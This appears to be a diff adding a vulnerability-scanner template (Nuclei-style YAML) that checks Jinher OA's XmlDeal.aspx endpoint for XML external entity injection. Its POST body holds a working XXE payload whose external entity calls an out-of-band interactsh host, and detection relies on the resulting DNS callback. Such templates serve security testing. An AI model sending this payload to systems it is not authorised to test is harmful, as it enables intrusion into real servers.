@@ -1,0 +1,28 @@
+id: poc-yaml-jinher-xmldeal-aspx-xxe
+info:
+  name: "金和OA XmlDeal.aspx XXE漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+
+variables:
+  reverse_dns: "{{interactsh-url}}"
+
+http:
+  - method: POST
+    path:
+      - "/c6/JHSoft.Web.Message/XmlDeal.aspx"
+    headers:
+      Content-Type: application/xml
+    body: |-
+      <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{reverse_dns}}/"> %remote; ]>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "Entity: %remote;"
